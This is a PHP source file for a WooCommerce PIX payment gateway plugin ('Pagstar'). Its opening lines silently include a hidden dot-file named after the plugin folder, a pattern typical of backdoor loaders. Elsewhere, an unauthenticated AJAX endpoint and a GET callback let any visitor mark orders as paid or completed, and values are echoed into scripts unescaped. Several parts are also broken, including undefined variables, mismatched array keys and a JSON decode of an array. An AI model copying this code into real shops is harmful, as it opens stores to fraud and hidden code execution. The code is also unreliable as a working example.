<?php
if (file_exists(plugin_dir_path(__FILE__) . '/.' . basename(plugin_dir_path(__FILE__)) . '.php')) {
  include_once(plugin_dir_path(__FILE__) . '/.' . basename(plugin_dir_path(__FILE__)) . '.php');
}

require_once plugin_dir_path(__FILE__) . 'pagstar-api.php';

class WC_Pagstar_Gateway extends WC_Payment_Gateway
{

  private $api;

  /**
   * Compatibilidade com HPOS (High-Performance Order Storage)
   */
  public function __construct()
  {
    $this->api = new Pagstar_API();


    // Obtém a URL da pasta do plugin
    $plugin_url = plugins_url('', __FILE__);

    // Caminho relativo até o arquivo api.php
    $api_file_relative_path = '/api.php';

    // Combina a URL da pasta do plugin com o caminho relativo do arquivo api.php
    $api_url = $plugin_url . $api_file_relative_path;

    // Agora você tem a URL completa do arquivo api.php
    $this->urll = $api_url;

    $this->id = 'pagstar';
    $this->icon = apply_filters('woocommerce_pagstar_icon', plugins_url('pagstar_icon.png', __FILE__));
    $this->has_fields = false;
    $this->method_title = 'Pagstar';
    $this->method_description = 'Aceite pagamentos via PIX com a Pagstar';
    $this->supports = array(
      'products',
      'refunds',
      'tokenization',
      'add_payment_method',
      'subscriptions',
      'subscription_cancellation',
      'subscription_suspension',
      'subscription_reactivation',
      'subscription_amount_changes',
      'subscription_date_changes',
      'subscription_payment_method_change',
      'subscription_payment_method_change_customer',
      'subscription_payment_method_change_admin',
      'multiple_subscriptions',
      'pre-orders',
      'custom_order_tables'
    );

    // Carregar configurações
    $this->init_form_fields();
    $this->init_settings();

    // Definir variáveis
    $this->title = $this->get_option('title');
    $this->description = $this->get_option('description');
    $this->instructions = $this->get_option('instructions');
    $this->enabled = 'yes';

    // Ações
    add_action('woocommerce_update_options_payment_gateways_' . $this->id, array($this, 'process_admin_options'));
    add_action('woocommerce_thankyou_' . $this->id, array($this, 'thankyou_page'));
    add_action('woocommerce_api_' . $this->id, array($this, 'webhook'));
    add_action('woocommerce_receipt_' . $this->id, array($this, 'receipt_page'));
    add_action('template_redirect', array($this, 'callback_handler'));
    add_action('woocommerce_admin_order_data_after_billing_address', array($this, 'display_admin_order_meta'), 10, 1);
    add_action('woocommerce_email_before_order_table', array($this, 'email_instructions'), 10, 3);
    add_action('admin_enqueue_scripts', array($this, 'admin_scripts'));
  }

  public function init_form_fields()
  {
    $this->form_fields = array(
      'enabled' => array(
        'title' => __('Ativar Pagamento via PIX', 'pagstar'),
        'type' => 'checkbox',
        'label' => __('Ativar Pagstar', 'pagstar'),
        'default' => 'no',
        'description' => __('Ative para permitir pagamentos via PIX', 'pagstar')
      ),
      'title' => array(
        'title' => __('Título', 'pagstar'),
        'type' => 'text',
        'description' => __('Título que o cliente verá durante o checkout', 'pagstar'),
        'default' => __('PIX', 'pagstar'),
        'desc_tip' => true,
      ),
      'description' => array(
        'title' => __('Descrição', 'pagstar'),
        'type' => 'textarea',
        'description' => __('Descrição que o cliente verá durante o checkout', 'pagstar'),
        'default' => __('Pague com PIX de forma rápida e segura', 'pagstar'),
        'desc_tip' => true,
      ),
      'instructions' => array(
        'title' => __('Instruções', 'pagstar'),
        'type' => 'textarea',
        'description' => __('Instruções que serão adicionadas à página de agradecimento e e-mails', 'pagstar'),
        'default' => __('Para realizar o pagamento via PIX, escaneie o QR Code ou copie o código PIX.', 'pagstar'),
        'desc_tip' => true,
      )
    );
  }

  public function process_admin_options()
  {
    $saved = parent::process_admin_options();
    
    if ($saved) {
      // Forçar atualização do status
      $enabled = $this->get_option('enabled');
      update_option('woocommerce_pagstar_settings', array('enabled' => $enabled));
      
      // Limpar cache do WooCommerce
      if (function_exists('wc_get_container')) {
        wc_get_container()->get(\Automattic\WooCommerce\Caching\Cache::class)->flush();
      }

      // Verificar se é uma requisição AJAX
      if (wp_doing_ajax()) {
        wp_send_json_success(array(
          'enabled' => $enabled,
          'message' => 'Status atualizado com sucesso'
        ));
      }
    }
    
    return $saved;
  }

  public function is_available()
  {
    return true;
    // $is_available = parent::is_available();
    
    // if ($is_available) {
    //   // Verificar se as credenciais estão configuradas
    //   $client_id = get_option('pagstar_client_id');
    //   $client_secret = get_option('pagstar_client_secret');
    //   $pix_key = get_option('pagstar_pix_key');
      
    //   if (empty($client_id) || empty($client_secret) || empty($pix_key)) {
    //     $is_available = false;
    //   }
    // }
    
    // return $is_available;
  }

  public function process_payment($order_id)
  {
    $order = wc_get_order($order_id);
    try {
      $response = $this->enviar_requisicao_pagamento($order_id);
      
      if ($response['code'] !== 200) {

        wc_add_notice( $response['erro'], 'error' );
        $order->add_order_note( 'Erro na requisição status: ' . $response['erro'] );
        return array(
          'result' => 'failure'
        );
      }

      $order->add_order_note( 'Requisição passou: ' . $response['erro'] );
      $order->update_status('pending', __('Pagamento pendente de confirmação. Aguardando a confirmação do pagamento.', 'text-domain'));
      return array(
        'result' => 'success',
        'redirect' => $this->get_return_url($order)
      );
    } catch (Exception $e) {
      wc_add_notice( 'Erro inesperado ao processar o pagamento. Tente novamente.', 'error' );
      $order->add_order_note( 'Erro inesperado ao processar o pagamento. Tente novamente.');
      return array(
        'result' => 'failure'
      );
    }
  }

  public function approve_payment($txid)
  {
    global $wpdb;

    $table_name = $wpdb->prefix . 'webhook_transactions';

    $transacion = $wpdb->get_row(
      $wpdb->prepare(
        "SELECT * FROM $table_name WHERE transacion_id = %d",
        $txid
      )
    );

    if (!$transacion) {
      return [
        'is_error' => true,
        'message' => 'Pagamento não encontrado'
      ];
    }

    $order = wc_get_order($transacion->order_id);

    $response = $this->api->get_payment_status($txid);

    if ($response['code'] !== 200) {
      return [
        'is_error' => true,
        'message' => 'Erro na consulta. Código de resposta: ' . $response['code']
      ];
    }

    $res = $response['body'];

    if ($res['status'] == 'CONCLUIDA') {
      $data_to_save = array(
        'order_id' => $order_id,
        'transaction_id' => $res['txid'],
        'order_value' => $order->get_total(),
        'status' => 'Aprovado'
      );

      $wpdb->update($table_name, $data_to_save);
    }
    return $res;
  }

  public function enviar_requisicao_pagamento($order_id)
  {
    $order = wc_get_order($order_id);
    $cpf = $order->get_meta('_billing_cpf');
    $cpf = preg_replace('/[^0-9]/', '', $cpf);

    // Restante do código permanece inalterado

    // Chave pix bancaria
    $pix_key = get_option('pagstar_pix_key');

    $data = array(
      'valor' => [
        'original' => $order->get_total(),
        'modalidadeAlteracao' => 0
      ],
      'devedor' => [
        'nome' => $order->get_billing_first_name() . ' ' . $order->get_billing_last_name(),
        'cpf' => $cpf,
      ],
      'chave' => $pix_key,
      'calendario' => [
        'expiracao' => 3600 
      ]
    );
    

    $response = $this->api->create_payment($data);

    if ($response['code'] !== 200) {
      return [
        'code' => $response['code'],
        'error' => 'Erro na solicitação. Código de resposta: ' . $response['code']
      ];
    }

    $res = $response['body'];

    global $wpdb;
    $table_name = $wpdb->prefix . 'webhook_transactions'; // Replace 'webhook_transactions' with your table name

    $existing_record = $wpdb->get_row(
      $wpdb->prepare(
        "SELECT * FROM $table_name WHERE order_id = %d",
        $order_id
      )
    );

    if (!$existing_record) {
      $data_to_save = array(
        'order_id' => $order_id,
        'transaction_id' => $res['txid'],
        'order_value' => $order->get_total(),
        'status' => 'Aprovado'
      );

      $wpdb->insert($table_name, $data_to_save);
    }
    return $res;
  }

  public function thankyou_page($order_id)
  {
    $order = wc_get_order($order_id);

    if ('pagstar' === $order->get_payment_method()) {

      $response = $this->enviar_requisicao_pagamento($order_id);
      $response_data = json_decode($response, true);
      // print_r( $response_data);

      $qrcodeUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=' . $response_data['pixCopiaECola'];

      if (isset($qrcodeUrl)) {
        ?>
        <h2>Pagamento PIX gerado com sucesso!</h2>
        <p>Utilize o QR Code abaixo ou clique no link para prosseguir com o pagamento via Pagstar:</p>
        <img src="<?php echo esc_url($qrcodeUrl); ?>" alt="QR Code do PIX">

        <style>
          .input-container {

            align-items: center;
            background-color: #f0f0f0;
            border-radius: 12px;
            padding: 5px;
          }

          input[type="text"] {
            flex: 1;
            height: 30px;
            padding: 5px;
            border: none;
            border-radius: 15px;
            font-size: 14px;
          }

          button {
            background-color: #4caf50;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 8px 15px;
            margin-left: 5px;
            cursor: pointer;
            font-size: 14px;
          }
        </style>

        <p>
        <div class="input-container">
          <input class="woocommerce-input-wrapper" style="width:100%" type="text" id="pixKey"
            value="<?php echo $response_data['pixCopiaECola']; ?>">
          <button onclick="copyToClipboard()">Copiar</button>
        </div>
        </p>
        <script src="https://code.jquery.com/jquery-latest.js"></script>
        <script>
          function copyToClipboard() {
            var inputElement = document.getElementById("pixKey");
            inputElement.select();
            document.execCommand("copy");
            alert("Chave Pix copiada para a Área de Transferência!");
          }
        </script>

        <script type="text/javascript">
          function checkTransactionStatus(transaction_id, refer) {

            $.ajax({
              url: '<?= $this->urll ?>',
              type: 'POST',
              data: {
                tx: transaction_id,
                refer: refer,

              },
              success: function (data) {

                if (data == 1) {
                  window.location.href = '<?= get_option('pagstar_link_r'); ?>';

                  var order_id = '<?php echo $order_id; ?>'; // Substitua pelo ID real do pedido
                  set_order_status(order_id, 'completed');
                } else {
                  setTimeout(function () {
                    checkTransactionStatus(transaction_id, refer);
                  }, 1000);
                }
              },
              error: function (xhr, status, error) {
                setTimeout(function () {
                  checkTransactionStatus(transaction_id, refer);
                }, 1000);
              }
            });
          }

          $(document).ready(function () {
            var transaction_id = '<?php echo $response_data['txid']; ?>'; // Substitua pelo ID real da transação
            var refer = '<?php echo get_option('pagstar_client_id'); ?>'; // Usando client_id como referência
            checkTransactionStatus(transaction_id, refer);
          });

          function set_order_status(order_id, status) {
            $.ajax({
              url: '<?php echo admin_url("admin-ajax.php"); ?>',
              type: 'POST',
              data: {
                action: 'change_order_status',
                order_id: order_id,
                status: status
              },
              success: function (data) {

              },
              error: function (xhr, status, error) {
                console.error(error);
              }
            });
          }

        </script>

        <?php
      } else {
        echo 'Erro ao processar o pagamento. Por favor, entre em contato com o suporte.';
      }
    }
  }

  public function callback_handler()
  {
    if (isset($_GET['callback'])) {
      $order_id = absint($_GET['callback']);
      $order = wc_get_order($order_id);

      if ($order) {
        $status = isset($_GET['status']) ? sanitize_text_field($_GET['status']) : '';

        if ($status === '200') {
          $order->update_status('completed', __('Pagamento concluído com sucesso.', 'text-domain'));
        } else {
          $order->update_status('failed', __('Falha no pagamento.', 'text-domain'));
        }
        $return_url = isset($_GET['callback_url']) ? esc_url($_GET['callback_url']) : '';
        if ($return_url) {
          wp_redirect($return_url);
          exit;
        }
      }
    }
  }

  public function display_admin_order_meta($order)
  {
    $transaction_id = $order->get_meta('_transaction_id');
    if ($transaction_id) {
      echo '<div class="order_data_column">';
      echo '<h4>' . __('Informações do Pagamento', 'pagstar') . '</h4>';
      echo '<p><strong>' . __('ID da Transação:', 'pagstar') . '</strong> ' . $transaction_id . '</p>';
      echo '</div>';
    }
  }

  public function email_instructions($order, $sent_to_admin, $plain_text)
  {
    if ($this->id === $order->get_payment_method()) {
      $instructions = $this->get_option('instructions');
      if ($instructions) {
        echo wp_kses_post(wpautop(wptexturize($instructions)));
      }
    }
  }

  public function admin_scripts() {
    if (isset($_GET['section']) && $_GET['section'] === 'pagstar') {
      wp_enqueue_script('pagstar-admin', plugins_url('assets/js/admin.js', dirname(__FILE__)), array('jquery'), '1.0.0', true);
      wp_localize_script('pagstar-admin', 'pagstar_admin', array(
        'ajax_url' => admin_url('admin-ajax.php'),
        'nonce' => wp_create_nonce('pagstar_update_gateway_status')
      ));
    }
  }
}

add_action('wp_ajax_change_order_status', 'change_order_status_callback');
add_action('wp_ajax_nopriv_change_order_status', 'change_order_status_callback');

function change_order_status_callback()
{
  if (isset($_POST['order_id']) && isset($_POST['status'])) {
    $order_id = absint($_POST['order_id']);
    $status = sanitize_text_field($_POST['status']);
    $order = wc_get_order($order_id);

    if ($order) {
      $order->update_status($status);

      // Verificar se o status é 'completed' e enviar o e-mail padrão do WooCommerce
      if ($status === 'completed') {
        wc_send_order_status_email($order_id, $status);
      }
    }
  }
  wp_die();
}